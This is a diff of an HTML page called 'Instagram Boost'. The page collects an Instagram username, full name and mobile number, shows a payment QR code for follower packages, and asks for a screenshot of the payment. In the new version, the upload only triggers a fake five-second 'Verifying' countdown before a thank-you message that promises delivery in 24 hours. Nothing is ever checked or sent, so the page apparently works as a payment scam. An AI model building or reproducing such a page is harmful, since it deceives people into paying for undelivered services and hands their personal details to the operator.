@@ -1,188 +1,258 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
 <title>Instagram Boost</title>
 
 <style>
+
 body{
 margin:0;
-font-family:Arial, sans-serif;
-background: linear-gradient(45deg,#f58529,#dd2a7b,#8134af,#515bd4);
+font-family: Arial, sans-serif;
+background: linear-gradient(45deg,#405DE6,#5851DB,#833AB4,#C13584,#E1306C,#FD1D1D,#F56040,#F77737,#FCAF45,#FFDC80);
 height:100vh;
 display:flex;
 justify-content:center;
 align-items:center;
+color:white;
 }
 
-.container{
+.page{
+display:none;
+width:100%;
+max-width:400px;
+}
+
+.active{
+display:block;
+}
+
+.card{
 background:white;
-padding:30px;
-border-radius:15px;
-width:320px;
+color:black;
+padding:25px;
+border-radius:12px;
 text-align:center;
 box-shadow:0 0 25px rgba(0,0,0,0.3);
 }
 
-.logo{
-font-size:30px;
-font-weight:bold;
+h1{
 margin-bottom:20px;
 }
 
-input, select{
+input,select{
 width:100%;
 padding:12px;
-margin:8px 0;
+margin:10px 0;
 border-radius:8px;
 border:1px solid #ccc;
+font-size:16px;
 }
 
-button{
+.btn{
 width:100%;
-padding:12px;
-margin-top:12px;
+padding:14px;
+margin-top:15px;
 border:none;
 border-radius:8px;
-background:#0095f6;
+font-size:18px;
 color:white;
-font-size:16px;
+background:#0095f6;
 cursor:pointer;
 transition:0.3s;
 }
 
-button:hover{
+.btn:hover{
 background:#1877f2;
-box-shadow:0 0 15px #0095f6,0 0 25px #0095f6;
-transform:scale(1.05);
+box-shadow:0 0 15px #0095f6;
 }
 
 .qr{
-width:200px;
-margin-top:15px;
+width:220px;
+margin:20px auto;
+display:block;
 }
 
-.hidden{
-display:none;
+.timer{
+font-size:22px;
+font-weight:bold;
+color:#0095f6;
 }
 
-#preview{
-width:100%;
-margin-top:10px;
-border-radius:10px;
-display:none;
+.thank{
+animation:pulse 1s infinite;
 }
+
+@keyframes pulse{
+0%{transform:scale(1)}
+50%{transform:scale(1.1)}
+100%{transform:scale(1)}
+}
+
 </style>
 </head>
-
 <body>
 
-<div class="container">
+<!-- PAGE 1 USERNAME -->
+<div class="page active" id="page1">
 
-<div class="logo">Instagram</div>
+<div class="card">
 
-<input type="text" id="username" placeholder="Enter Username" required>
+<h1>Instagram</h1>
 
-<select id="package" required>
+<input id="username" placeholder="Enter Instagram Username">
+
+<button class="btn" onclick="next1()">Continue</button>
+
+</div>
+</div>
+
+
+<!-- PAGE 2 DETAILS -->
+<div class="page" id="page2">
+
+<div class="card">
+
+<h1>Enter Details</h1>
+
+<input id="name" placeholder="Full Name">
+
+<input id="mobile" placeholder="Mobile Number">
+
+<select id="package">
 <option value="">Select Package</option>
-<option value="1K Followers - ₹28">1K Followers - ₹28</option>
-<option value="5K Followers - ₹120">5K Followers - ₹120</option>
-<option value="10K Followers - ₹220">10K Followers - ₹220</option>
+<option>1K Followers ₹28</option>
+<option>5K Followers ₹50</option>
+<option>10K Followers ₹100</option>
+<option>20K Followers ₹200</option>
+<option>50K Followers ₹500</option>
 </select>
 
-<button onclick="showQR()">Continue</button>
+<button class="btn" onclick="next2()">Continue</button>
 
-<div id="paymentSection" class="hidden">
+</div>
+</div>
 
-<h3>Scan & Pay</h3>
+
+<!-- PAGE 3 PAYMENT -->
+<div class="page" id="page3">
+
+<div class="card">
+
+<h1>Scan & Pay</h1>
 
 <img src="myqr.png" class="qr">
 
-<input type="file" id="screenshot" accept="image/*">
+<input type="file" id="file">
 
-<img id="preview">
+<button class="btn" onclick="upload()">Upload</button>
 
-<button onclick="submitData()">Upload Screenshot</button>
+<p class="timer" id="timer"></p>
+
+</div>
+</div>
+
+
+<!-- PAGE 4 THANK YOU -->
+<div class="page" id="page4">
+
+<div class="card thank">
+
+<h1>Thank You ❤️</h1>
+
+<p>Followers will be delivered within</p>
+
+<h2>24 Hours</h2>
 
 </div>
 
 </div>
+
+
 
 <script>
 
-const scriptURL = "https://script.google.com/macros/s/AKfycbw4BvEdVbYvOZr7tswFcozNM8987yEaIuTxkDAqAbxQmwoVl1NgUVZSTGoAHyE-f9dJ/exec";
+function show(page)
+{
+document.querySelectorAll(".page").forEach(p=>p.classList.remove("active"));
+document.getElementById(page).classList.add("active");
+}
 
-function showQR(){
 
-let username = document.getElementById("username").value;
-let pkg = document.getElementById("package").value;
 
-if(username=="" || pkg==""){
-alert("Please fill all details");
+function next1()
+{
+
+let username=document.getElementById("username").value;
+
+if(username=="")
+{
+alert("Enter Username");
 return;
 }
 
-document.getElementById("paymentSection").classList.remove("hidden");
+show("page2");
 
 }
 
-document.getElementById("screenshot").addEventListener("change", function(){
 
-let file = this.files[0];
-let preview = document.getElementById("preview");
 
-if(file){
-preview.src = URL.createObjectURL(file);
-preview.style.display="block";
-}
+function next2()
+{
 
-});
+let name=document.getElementById("name").value;
+let mobile=document.getElementById("mobile").value;
+let package=document.getElementById("package").value;
 
-function submitData(){
-
-let username = document.getElementById("username").value;
-let pkg = document.getElementById("package").value;
-let file = document.getElementById("screenshot").files[0];
-
-if(!file){
-alert("Upload screenshot");
+if(name=="" || mobile=="" || package=="")
+{
+alert("Fill all details");
 return;
 }
 
-let reader = new FileReader();
+show("page3");
 
-reader.onload = function(){
+}
 
-fetch(scriptURL,{
-method:"POST",
-body:JSON.stringify({
-username:username,
-package:pkg,
-screenshot:reader.result
-})
-})
-.then(res=>res.text())
-.then(data=>{
-alert("Submitted Successfully ✅");
 
-document.getElementById("username").value="";
-document.getElementById("package").value="";
-document.getElementById("screenshot").value="";
-document.getElementById("preview").style.display="none";
-document.getElementById("paymentSection").classList.add("hidden");
-})
-.catch(err=>{
-alert("Error submitting ❌");
-});
 
-};
+function upload()
+{
 
-reader.readAsDataURL(file);
+let file=document.getElementById("file").files.length;
+
+if(file==0)
+{
+alert("Upload Screenshot");
+return;
+}
+
+let time=5;
+
+document.getElementById("timer").innerHTML="Verifying "+time;
+
+let interval=setInterval(function(){
+
+time--;
+
+document.getElementById("timer").innerHTML="Verifying "+time;
+
+if(time==0)
+{
+clearInterval(interval);
+
+show("page4");
+
+}
+
+},1000);
 
 }
 
 </script>
+
 
 </body>
 </html>
